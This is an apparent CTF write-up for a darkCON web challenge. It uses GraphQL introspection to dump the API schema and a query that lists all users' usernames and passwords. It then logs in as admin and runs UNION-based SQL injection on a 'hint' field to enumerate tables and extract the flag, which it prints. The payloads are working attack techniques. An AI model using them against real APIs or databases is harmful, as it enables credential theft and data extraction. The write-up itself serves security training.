<h1>DarkCon Challs</h1>
<h4>Description: 
<p>A place where you can see all the challs of darkCON CTF using api but not the flag or can you @_@ ?
PS :- Try to get the flag of this chall xD</p>
<h4>Category: Web</h4>
<h4>Link:http://darkcon-challs.darkarmy.xyz</h4>

There is a login page. If you look at <b>js/auth.js</b> you can see that there is an graphql api bein used.
Now we can capture the request in burp (forward the request to repeater) and try to dump all the schema avilable to us using this payload.
<h4>{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}}</h4>
<br></br><img src='./images/Screenshot (105).png' /><br></br>


We have the objects. There is a <b>Query</b> object which has <b>allUsers</b> fields. If you go down you can see that allUsers has three fields id,username and password.
We can get the data with this payload
<h5>query=query+Query{allUsers{id,username,password}}</h5>
This gives us the data in the fields
<br></br><img src='./images/Screenshot (106).png' /><br></br>

Login with admin's creds and then add his cookies to the repeater. We can also see there is a <b>hint</b> feild which takes an <b>chall_id</b> as parameter.The <b>chall_id</b> needs to be a string. If we send a single quote in the chall_id then we get an error saying Problem in our SQL syntax. We can try for sql injection now.We can determine the columns using the union select statement.
<br></br><img src='./images/Screenshot (107).png' /><br></br>
<b>NOTE: You need to put '-1' in the injection instead of 1 at the start to reflect the value at select statement i.e you injection would be '-1 union select 1,2,3'</b>
<br></br>
Value 1 is reflected in the response. 
<br></br>
Now we can get the database with this (in burp repeater add the '+' instead of spaces)
<h4>-1 union select database(),3,4</h4>
Dump tables
<h4>-1 union select group_concat(table_name),2,3 from information_schema.tables where table_schema='darkcon'</h4>
Dump columns
<h4>-1 union select group_concat(column_name),2,3 from information_schema.columns where table_name='flags'</h4>
Now if we dump the chall_flag, we can see that some flags are not visible i.e only some part of the dump is visible thus we need to use substr and look for the right offset to get the flag.
<br></br>
Payload to get the flag is
<h5>-1 union select substr(group_concat(chall_flag),200,500),2,3 from flags</h5>

<h4>FLAG: darkCON{w0ww_y0u_re411y_f0und_m3}</h4>
